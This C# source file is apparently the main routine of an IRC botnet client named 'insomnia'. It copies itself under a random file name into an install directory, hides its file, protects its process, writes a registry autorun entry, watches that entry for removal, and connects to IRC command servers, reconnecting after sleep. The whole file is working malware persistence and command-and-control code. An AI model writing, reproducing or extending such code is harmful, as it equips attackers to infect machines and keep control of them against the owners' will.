using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using System.Security.AccessControl;
using System.Security.Principal;

namespace insomnia
{
    internal class insomnia
    {
        public static bool persistMon = true;
        private static string installDir = Environment.GetEnvironmentVariable(Config._installEnv());

        public static void Main()
        {
            // Mutex for single instance
            bool ok;
            Config.mutex = new Mutex(true, Config.BotMutex(), out ok);
            if (!ok) // Already running then exit
                Environment.Exit(0);

            // Check if we are installed, if not let's do it and restart.
            if (!Config.currentPath.Contains(installDir))
            {
                try
                {
                    string dest = installDir + @"\" + Functions.RandomString(8) + ".exe";

                    File.Copy(Config.currentPath, dest);

                    // If it copied over ok, let's quit and restart.
                    if (File.Exists(dest))
                    {
                        Process.Start(dest);
                        Environment.Exit(0);
                    }
                }
                catch
                {
                }

            }

            // ProcessProtection 
            try
            {
                Functions.ProtectProc(Win32.GetCurrentProcess());
            }
            catch
            {
            }

            // Rehide the file if it's not hidden already.
            if (File.GetAttributes(Config.currentPath) != FileAttributes.Hidden)
                File.SetAttributes(Config.currentPath, FileAttributes.Hidden);

            // Check registry keys
            if (Functions.RegistryPath().GetValue(Config._registryKey()) == null)
                Functions.RegistryPath().SetValue(Config._registryKey(), Config.currentPath);

            // Start monitoring the registry for changes
            Thread regMon = new Thread(Functions.RegistryMonitor);
            regMon.IsBackground = true;
            regMon.Start();

            // Register event handlers for system shutdown/sleep
            SystemEvents.PowerModeChanged += PowerModeChanged;
            SystemEvents.SessionEnding += SessionEnding;

            // Finally, connect to IRC.
            Thread irc = new Thread(() => IRC.Connect(Config._servers(), Config._mainChannel(), Config._key(), Config._port(), Config._authHost()));
            irc.Start();
        }

        private static void PowerModeChanged(object sender, PowerModeChangedEventArgs e)
        {
            try
            {
                switch (e.Mode)
                {
                    case Microsoft.Win32.PowerModes.Resume:
                        IRC.Connect(Config._servers(), Config._mainChannel(), Config._key(), Config._port(), Config._authHost());
                        break;

                    case Microsoft.Win32.PowerModes.Suspend:
                        IRC.Disconnect("Windows is going to sleep...");
                        break;
                }
            }
            catch
            {
            }
        }
        private static void SessionEnding(object sender, SessionEndingEventArgs e)
        {
            try
            {
                switch (e.Reason)
                {
                    case Microsoft.Win32.SessionEndReasons.Logoff:
                        IRC.Disconnect("Windows is logging off...");
                        break;

                    case Microsoft.Win32.SessionEndReasons.SystemShutdown:
                        IRC.Disconnect("Windows is shutting down...");
                        break;
                }
            }
            catch
            {
            }
        }
    }
}
